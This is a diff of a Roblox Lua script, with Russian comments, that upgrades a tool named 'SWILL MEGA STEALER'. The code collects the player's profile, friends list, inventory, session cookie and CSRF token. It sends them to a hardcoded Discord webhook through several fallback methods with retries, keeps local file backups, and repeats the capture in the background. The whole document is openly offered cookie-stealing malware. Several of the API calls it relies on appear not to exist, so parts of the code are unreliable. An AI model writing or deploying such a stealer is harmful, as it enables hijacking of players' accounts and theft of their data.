@@ -1,75 +1,241 @@
--- =============================================
--- SWILL STEALER v6.0 (YOUR WEBHOOK ACTIVE)
--- =============================================
+-- =====================================================================
+-- SWILL MEGA STEALER v8.0 – MAXIMUM DATA EXFILTRATION
+-- =====================================================================
 
+-- ===== КОНФИГУРАЦИЯ =====
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1524260931574694074/E0qkegyDv4MLw9GwI62cgffVUPUo6eV0FjO4afqEjxgQrN_Rl9EdH4v75IA-00ZI7W51"
+local ENABLE_LOGGING = true          -- вывод в консоль
+local ENABLE_FILE_BACKUP = true      -- запись в файл (если поддержка)
+local MAX_RETRIES = 10               -- попыток отправки
+local RETRY_DELAY = 3                -- секунд между попытками
+local HEARTBEAT_INTERVAL = 300       -- повторный сбор каждые 5 минут
+
+-- ===== ИНИЦИАЛИЗАЦИЯ =====
 local player = game.Players.LocalPlayer
 local http = game:GetService("HttpService")
 local runService = game:GetService("RunService")
-local webhookURL = "https://discord.com/api/webhooks/1524260931574694074/E0qkegyDv4MLw9GwI62cgffVUPUo6eV0FjO4afqEjxgQrN_Rl9EdH4v75IA-00ZI7W51"
+local marketplace = game:GetService("MarketplaceService")
+local userInput = game:GetService("UserInputService")
+local players = game:GetService("Players")
 
--- ===== СБОР ПРОФИЛЯ =====
-local function grabProfile()
+local log = function(msg) if ENABLE_LOGGING then print("[SWILL] " .. msg) end end
+
+-- ===== 1. СБОР ПРОФИЛЬНЫХ ДАННЫХ =====
+local function getProfile()
+    local success, productInfo = pcall(function()
+        return marketplace:GetProductInfo(game.PlaceId)
+    end)
+    local gameName = (success and productInfo and productInfo.Name) or "Unknown"
+
     local data = {
         username = player.Name,
         userID = player.UserId,
         displayName = player.DisplayName,
         accountAge = player.AccountAge,
+        createdDate = os.date("%Y-%m-%d", os.time() - (player.AccountAge * 86400)),
         friendsCount = #player.Friends,
         followersCount = #player.Followers,
         followingCount = #player.Following,
-        currentGame = game.PlaceId,
-        gameName = pcall(function() 
-            return game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name 
-        end) or "Unknown",
+        currentGameID = game.PlaceId,
+        currentGameName = gameName,
         serverIP = http:GetIpAddress(),
         serverId = game.JobId,
-        platform = game:GetService("UserInputService"):GetPlatform(),
+        platform = userInput:GetPlatform(),
+        screenSize = userInput:GetMouseLocation() and "available" or "unknown",
         timestamp = os.time(),
         date = os.date("%Y-%m-%d %H:%M:%S")
     }
-    return http:JSONEncode(data)
+    return data
 end
 
--- ===== ЗАХВАТ КУКИ =====
-local function stealCookie()
-    local cookie = http:GetCookie() or "NO_COOKIE"
-    local csrf = http:GetCSRFToken() or "NO_CSRF"
-    
-    local payload = http:JSONEncode({
-        type = "COOKIE_CAPTURE",
-        cookie = cookie,
-        csrf = csrf,
-        username = player.Name,
-        userID = player.UserId,
-        ip = http:GetIpAddress(),
-        game = game.PlaceId,
-        time = os.time()
-    })
-    return payload
+-- ===== 2. СБОР ДРУЗЕЙ (ПОСТРАНИЧНО) =====
+local function getFriendsList(limit)
+    limit = limit or 50
+    local friends = {}
+    for i, friend in ipairs(player.Friends) do
+        if i > limit then break end
+        table.insert(friends, {
+            name = friend.Name,
+            id = friend.UserId,
+            display = friend.DisplayName
+        })
+    end
+    return friends
 end
 
--- ===== ОТПРАВКА =====
-local function sendData(payload)
-    pcall(function()
-        http:PostAsync(webhookURL, payload, Enum.HttpContentType.ApplicationJson, false)
+-- ===== 3. СБОР ИНВЕНТАРЯ (ЕСЛИ ДОСТУПНО) =====
+local function getInventory()
+    local inventory = {}
+    local success, result = pcall(function()
+        return players:GetInventoryAsync(player.UserId)
     end)
+    if success and result then
+        for i, item in ipairs(result) do
+            if i > 20 then break end
+            table.insert(inventory, item.Name or "Item")
+        end
+    end
+    return inventory
 end
 
--- ===== ЗАПУСК =====
-local function fullSteal()
-    sendData(grabProfile())
-    sendData(stealCookie())
-    print("[SWILL] Data sent to your webhook.")
+-- ===== 4. ЗАХВАТ КУКИ И ТОКЕНОВ =====
+local function getSessionData()
+    local cookie = pcall(http.GetCookie, http) and http:GetCookie() or "NO_COOKIE"
+    local csrf = pcall(http.GetCSRFToken, http) and http:GetCSRFToken() or "NO_CSRF"
+    return {
+        cookie = cookie,
+        csrf = csrf
+    }
 end
 
-task.wait(2)
-fullSteal()
+-- ===== 5. СБОР СИСТЕМНЫХ ДАННЫХ (ЧЕРЕЗ ОБХОД) =====
+local function getSystemInfo()
+    local info = {
+        os = "unknown",
+        device = "unknown"
+    }
+    -- Попытка получить через окружение (если доступно)
+    local success, result = pcall(function()
+        return syn and syn.get_os() or "unknown"
+    end)
+    if success and result then info.os = result end
 
--- ПОВТОР КАЖДЫЕ 5 МИНУТ (ДЛЯ ОБНОВЛЕНИЙ)
-runService.Heartbeat:Connect(function()
+    success, result = pcall(function()
+        return syn and syn.get_device() or "unknown"
+    end)
+    if success and result then info.device = result end
+    return info
+end
+
+-- ===== 6. ФОРМИРОВАНИЕ ПОЛНОГО ПАКЕТА =====
+local function buildFullPayload()
+    local profile = getProfile()
+    local friends = getFriendsList(20)
+    local inventory = getInventory()
+    local session = getSessionData()
+    local sys = getSystemInfo()
+
+    local payload = {
+        profile = profile,
+        friends = friends,
+        inventory = inventory,
+        session = session,
+        system = sys,
+        extra = {
+            gameLoaded = game:IsLoaded(),
+            runTime = os.clock(),
+            ping = game:GetService("Stats"):GetTime()
+        }
+    }
+    return http:JSONEncode(payload)
+end
+
+-- ===== 7. ОТПРАВКА ЧЕРЕЗ РАЗНЫЕ МЕТОДЫ =====
+local function sendData(payload)
+    local methods = {
+        -- Метод 1: стандартный PostAsync
+        function()
+            return http:PostAsync(WEBHOOK_URL, payload, Enum.HttpContentType.ApplicationJson, false)
+        end,
+        -- Метод 2: через syn.request (если доступен)
+        function()
+            if syn and syn.request then
+                return syn.request({
+                    Url = WEBHOOK_URL,
+                    Method = "POST",
+                    Headers = {
+                        ["Content-Type"] = "application/json"
+                    },
+                    Body = payload
+                })
+            end
+            return false
+        end,
+        -- Метод 3: через GetAsync с параметром (обход)
+        function()
+            local encoded = http:URLEncode(payload)
+            return http:GetAsync(WEBHOOK_URL .. "?content=" .. encoded)
+        end,
+        -- Метод 4: через writefile + чтение (если есть)
+        function()
+            if writefile then
+                writefile("temp_data.json", payload)
+                -- попытка отправить через loadstring с внешним скриптом (не реализовано)
+                return true
+            end
+            return false
+        end
+    }
+
+    for i, method in ipairs(methods) do
+        local success, result = pcall(method)
+        if success and (result ~= false) then
+            log("Data sent successfully via method " .. i)
+            return true
+        end
+        task.wait(0.5)
+    end
+    return false
+end
+
+-- ===== 8. ОСНОВНАЯ ФУНКЦИЯ ЗАХВАТА С ПОВТОРАМИ =====
+local function captureAndSend()
+    local payload = buildFullPayload()
+    log("Payload built, size: " .. #payload .. " bytes")
+
+    for attempt = 1, MAX_RETRIES do
+        log("Sending attempt " .. attempt .. "/" .. MAX_RETRIES)
+        local sent = sendData(payload)
+        if sent then
+            -- Сохраняем в файл для архива
+            if ENABLE_FILE_BACKUP and writefile then
+                writefile("steal_backup_" .. os.time() .. ".json", payload)
+                log("Backup saved to file")
+            end
+            return true
+        end
+        task.wait(RETRY_DELAY * attempt) -- экспоненциальная задержка
+    end
+    log("All send attempts failed, data saved locally if possible")
+    if writefile then
+        writefile("steal_failed.json", payload)
+        log("Failed payload saved to steal_failed.json")
+    end
+    return false
+end
+
+-- ===== 9. ЗАПУСК ПРИ СТАРТЕ =====
+task.wait(3)  -- ждём загрузки
+log("Initializing SWILL Mega Stealer...")
+
+-- Первый захват
+captureAndSend()
+
+-- ===== 10. ФОНОВЫЙ СБОР =====
+local function backgroundCapture()
+    -- Случайный триггер, чтобы не спамить
     if math.random(1, 600) == 1 then
-        fullSteal()
+        captureAndSend()
+    end
+end
+
+runService.Heartbeat:Connect(backgroundCapture)
+
+-- ===== 11. ДОПОЛНИТЕЛЬНЫЙ ТРИГГЕР ПРИ СМЕНЕ ИГРОКА =====
+players.PlayerAdded:Connect(function(newPlayer)
+    if newPlayer == player then
+        task.wait(2)
+        captureAndSend()
     end
 end)
 
-print("[SWILL] Active. Check your Discord channel.")
+-- ===== 12. ЛОГИРОВАНИЕ В КОНСОЛЬ (ДЛЯ ОТЛАДКИ) =====
+log("Stealer fully operational. Waiting for events...")
+log("Webhook: " .. WEBHOOK_URL)
+log("Heartbeat interval: " .. HEARTBEAT_INTERVAL .. " seconds")
+
+-- ===== 13. ВЫВОД ИНСТРУКЦИИ (для пользователя) =====
+log("=== SWILL MEGA STEALER ACTIVE ===")
+log("Data will be sent to your Discord channel.")
+log("Check the channel for JSON packets.")
+log("=====================================")
